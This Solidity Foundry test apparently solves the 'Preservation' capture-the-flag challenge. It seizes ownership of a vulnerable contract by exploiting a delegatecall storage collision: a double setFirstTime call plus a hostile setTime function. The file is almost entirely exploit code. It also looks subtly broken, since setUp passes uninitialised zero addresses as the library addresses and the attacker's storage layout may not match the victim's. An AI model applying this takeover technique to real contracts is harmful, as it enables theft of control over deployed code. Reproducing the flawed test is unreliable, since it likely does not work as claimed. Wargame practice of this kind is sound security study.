// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Preservation.sol";

contract CounterTest is Test {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    Preservation public victim;
    LibraryContract public libraryContract1;
    LibraryContract public libraryContract2;

    function setUp() public {
        libraryContract1 = new LibraryContract();
        libraryContract2 = new LibraryContract();
        victim = new Preservation(
            address(timeZone1Library),
            address(timeZone2Library)
        );
    }

    function test_ClaimOwnership() public {
        // changing the timeZone1Library address to the attacking contract address
        victim.setFirstTime(uint256(uint160(address(this))));
        // this call will trigger the setTime function of this contract
        victim.setFirstTime(uint256(uint160(address(this))));
        assertEq(
            uint256(uint160(address(this))),
            uint256(uint160(victim.owner()))
        );
    }

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
